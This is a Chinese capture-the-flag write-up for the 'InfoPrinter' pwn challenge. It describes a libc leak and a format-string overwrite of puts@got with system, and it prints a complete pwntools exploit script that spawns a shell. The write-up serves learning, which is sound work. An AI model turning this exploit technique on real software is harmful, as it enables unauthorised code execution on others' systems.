# [SWPUCTF 2022 新生赛]InfoPrinter_WP

**格式化字符串任意写 + GOT 劫持（puts → system）+ libc 泄漏**

> **平台**：NSSCTF  
> **方向**：Pwn  
> **知识点**：格式化字符串漏洞、GOT 覆盖、libc 泄漏  
> **难度**：中等

## 一、信息获取

![image01](/pwn/[SWPUCTF%202022%20新生赛]InfoPrinter_WP/image/image01.png)

checksec：无RELRO、PIE

## 二、分析

![image02](/pwn/[SWPUCTF%202022%20新生赛]InfoPrinter_WP/image/image02.png)

大致思路：
1.源程序泄露了 `puts` 函数的地址，以此算出基地址，从而计算出 `system` 的地址
2.利用格式化字符串漏洞，将 `puts@got` 覆盖为 `system` 的地址，并将参数 `xx` 的内容修改为 `/bin/sh`

## 三、EXP

```python
from pwn import *

context.binary = './InfoPrinter'

r = remote(...)
elf = context.binary
#or elf = ELF('./InfoPrinter')
libc = ELF('./libc-2.31.so')

r.recvuntil(b"Here is a key ")
puts = int(r.recv().split()[0],16)
#删去多余的空格，转换为int

libcbase = puts - libc.sym['puts']
system = libcbase + libc.sym['system']
#地址计算

puts_got = elf.got['puts']

xx = 0x403878

payload = fmtstr_payload(6,{puts_got:system, xx:b'/bin/sh\x00'})
#offset=6
r.sendline(payload)
r.interactive()

```

## 四、总结

格式化字符串任意写 + GOT 劫持（puts → system）+ libc 泄漏
思路仅供参考，如有疑问或发现疏漏，欢迎各位师傅在评论区指正交流。
